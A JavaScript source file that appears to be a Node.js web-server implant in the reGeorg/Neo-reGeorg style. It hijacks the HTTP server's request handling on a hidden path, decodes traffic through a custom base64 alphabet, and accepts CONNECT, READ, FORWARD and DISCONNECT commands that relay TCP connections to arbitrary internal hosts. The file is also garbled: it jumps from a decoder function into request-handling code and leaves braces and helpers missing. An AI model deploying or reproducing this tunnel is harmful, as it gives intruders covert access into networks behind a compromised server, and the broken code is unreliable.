(async () => {
  const path = '/proxy_path';

  const http = await import('node:http');
  const net = await import('node:net');

  const DATA = 1;
  const CMD = 2;
  const MARK = 3;
  const STATUS = 4;
  const ERROR = 5;
  const IP = 6;
  const PORT = 7;
  const REDIRECTURL = 8;
  const FORCEREDIRECT = 9;

  const en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  const de = "dhULNVGsuAk/MxH6ibjcEfRqDWYznXBe9Pl7+SKoZ8pJaICgrQO0mF21yv345wtT";

  const states = new Map();

  function blv_decode(data) {
    const info = {};
    let i = 0;
    while (i < data.length) {

          let post_data = body;

          const translated = strtr(post_data, de, en);
          const decoded = Buffer.from(translated, 'base64');
          let info;
          try {
            info = blv_decode(decoded);
          } catch (e) {
            res.writeHead(500);
            res.end();
            return;
          }

          let rinfo = {};
          let sayhello = false;
          const mark = info[MARK] ? info[MARK].toString() : null;
          const cmd = info[CMD] ? info[CMD].toString() : null;

          if (!cmd || !mark) {
            sayhello = true;
          } else {
            switch (cmd) {
              case "CONNECT": {
                const target = info[IP] ? info[IP].toString() : null;
                const port = info[PORT] ? parseInt(info[PORT].toString()) : null;
                if (!target || !port) {
                  rinfo[STATUS] = Buffer.from('FAIL');
                  rinfo[ERROR] = Buffer.from('Missing IP or PORT');
                  const output = blv_encode(rinfo);
                  const base = output.toString('base64');
                  const translated_out = strtr(base, en, de);
                  res.end(translated_out);
                  return;
                }
                const socket = net.createConnection({ port, host: target });
                let connected = false;
                socket.on('connect', () => {
                  connected = true;
                  const state = {
                    run: true,
                    writebuf: Buffer.alloc(0),
                    readbuf: Buffer.alloc(0),
                    socket,
                  };
                  states.set(mark, state);
                  socket.on('data', data => {
                    if (state.run) {
                      state.readbuf = Buffer.concat([state.readbuf, data]);
                      if (state.readbuf.length > 524288) {
                        state.readbuf = state.readbuf.slice(state.readbuf.length - 524288);
                  }
                });
                break;
              }
              case "DISCONNECT": {
                const state = states.get(mark);
                if (state) {
                  state.run = false;
                  state.socket.destroy();
                }
                const output = blv_encode(rinfo);
                const base = output.toString('base64');
                const translated_out = strtr(base, en, de);
                res.end(translated_out);
                break;
              }
              case "READ": {
                const state = states.get(mark);
                if (!state || !state.run) {
                  rinfo[STATUS] = Buffer.from('FAIL');
                  rinfo[ERROR] = Buffer.from('TCP session is closed');
                } else {
                  rinfo[STATUS] = Buffer.from('OK');
                  rinfo[DATA] = state.readbuf;
                  state.readbuf = Buffer.alloc(0);
                  res.setHeader("Connection", "Keep-Alive");
                }
                const output = blv_encode(rinfo);
                const base = output.toString('base64');
                const translated_out = strtr(base, en, de);
                res.end(translated_out);
                break;
              }
              case "FORWARD": {
                const state = states.get(mark);
                if (!state || !state.run) {
                  rinfo[STATUS] = Buffer.from('FAIL');
                  rinfo[ERROR] = Buffer.from('TCP session is closed');
                } else {
                  const rawPostData = info[DATA] || Buffer.alloc(0);
                  if (rawPostData.length > 0) {
                    state.writebuf = Buffer.concat([state.writebuf, rawPostData]);
                    rinfo[STATUS] = Buffer.from('OK');
                    res.setHeader("Connection", "Keep-Alive");
                  } else {
                    rinfo[STATUS] = Buffer.from('FAIL');
                    rinfo[ERROR] = Buffer.from('POST data parse error');
                  }
                }
                const output = blv_encode(rinfo);
                const base = output.toString('base64');
                const translated_out = strtr(base, en, de);
                res.end(translated_out);
                break;
              }
              default:
                sayhello = true;
                break;
            }
          }

          if (sayhello) {
            const message = "6UNI/jhLR7X7fqPmY+m0BofOMNXNbVV2XNbiEVEODRxUbshHWKXC/mQWx0SNYVDFx1bKY0VDjcS3RcS/nGIOzVA0XOdI/cy=";
            const translated_m = strtr(message, de, en);
            const decoded_m = Buffer.from(translated_m, 'base64').toString();
            res.end(decoded_m);
          }
        });
        return true;
      }
    }
    return originalEmit.apply(this, arguments);
  };
})();
